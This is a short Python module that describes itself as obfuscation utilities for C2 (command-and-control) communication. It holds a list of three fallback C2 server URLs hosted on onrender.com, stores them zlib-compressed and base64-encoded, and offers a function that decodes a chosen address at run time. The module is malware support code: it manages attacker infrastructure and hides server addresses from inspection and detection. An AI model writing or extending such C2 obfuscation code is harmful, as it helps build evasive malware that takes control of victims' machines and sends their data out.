"""Obfuscation utilities for C2 communication."""
import base64
import zlib

# Multiple fallback C2 servers
C2_URLS = [
    "https://ideal-octo-spoon.onrender.com/api/v1",
    "https://quiet-sky-123.onrender.com/api/v1", 
    "https://bold-river-456.onrender.com/api/v1"
]

# Pre-computed obfuscated URLs
OBFUSCATED_C2 = [
    base64.b64encode(zlib.compress(url.encode())).decode() 
    for url in C2_URLS
]

def deobfuscate(index: int) -> str:
    """Deobfuscate C2 URL by index."""
    return zlib.decompress(base64.b64decode(OBFUSCATED_C2[index])).decode()